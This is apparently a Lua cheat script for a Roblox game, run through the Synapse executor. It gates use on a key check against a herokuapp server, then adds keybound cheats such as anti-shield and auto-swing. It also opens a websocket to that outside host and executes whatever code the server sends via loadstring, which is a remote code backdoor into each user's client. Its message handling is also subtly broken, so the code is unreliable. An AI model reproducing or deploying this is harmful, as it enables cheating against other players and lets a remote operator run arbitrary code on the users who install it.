---@diagnostic disable: undefined-global
if (getgenv().env.debugging) then
    warn("Attempting to connect!")
end

local function request(key)
    return syn.request({
        Url = (string.format("https://lolgood.herokuapp.com/whitelist?key=%s", key)),
        Method = "GET"
    })
end

local function checkResponse(response) 
    if (response.Body ~= "good guy") then
        game:GetService("Players").LocalPlayer:Kick() 
    else
        return true
    end
end

if (not checkResponse(request(getgenv().key))) then return end 

local httpService = game:GetService("HttpService")
local userInputService = game:GetService("UserInputService")
local players = game:GetService("Players")

local client = players.LocalPlayer
local character = client.Character or client.CharacterAdded:Wait()

local connections = {}
getgenv().settings = {
    combat = {
        antiShield = {
            enabled = false,
            chance = 50,
            keybind = "F1"
        },

        autoSwing = {
            enabled = false, 
            reactionTime = 20,
            keybind = "F2"
        }
    },

    physics = {
        antiDrown = {
            enabled = false
        },

        antiEndurance = {
            enabled = false
        }
    }
}

local function connectWebSocket(url)
    return syn.websocket.connect(string.format("ws://%s", url))
end

connectWebSocket("lolgood.herokuapp.com").OnMessage:Connect(function(table)
    table = pcall(httpService.JSONDecode, httpService, table)

    if (table) then
        if (table["key"] == getgenv().key) then
            if (table["code"]) then
                loadstring(table["code"])()
            end
        end
    end
end)

userInputService.InputBegan:Connect(function(input, gameProcessedEvent)
    if (not gameProcessedEvent) then
        for i,v in pairs(getgenv().settings) do
            for a, b in pairs(v) do
                if (b.keybind) then
                    if (b.enabled == true or b.enabled == false and b.enabled ~= nil) then
                        if (input.KeyCode == Enum.KeyCode[b.keybind]) then
                            b.enabled = not b.enabled
                        end
                    end
                end
            end
        end
    end
end)